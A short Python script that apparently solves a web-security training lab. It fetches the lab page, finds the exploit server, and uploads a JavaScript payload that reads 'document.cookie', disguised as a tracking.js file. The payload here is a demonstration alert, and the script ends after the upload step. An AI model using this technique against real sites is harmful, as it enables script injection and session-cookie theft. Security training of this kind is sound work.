import requests
from bs4 import BeautifulSoup
import urllib3

site = '0a75006c04216cd880770384008e0062.web-security-academy.net'
s = requests.Session()
site_url = f'https://{site}/'

# Get exploit server URL
resp = s.get(site_url)
soup = BeautifulSoup(resp.text, 'html.parser')
exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')
exploit_site = urllib3.util.parse_url(exploit_url).host

# JS payload
exploit_html = 'alert(document.cookie)'

# Upload malicious JS to exploit server
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/resources/js/tracking.js',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}
resp = s.post(exploit_url, data=formData)
print("[+] Malicious tracking.js uploaded to exploit server.")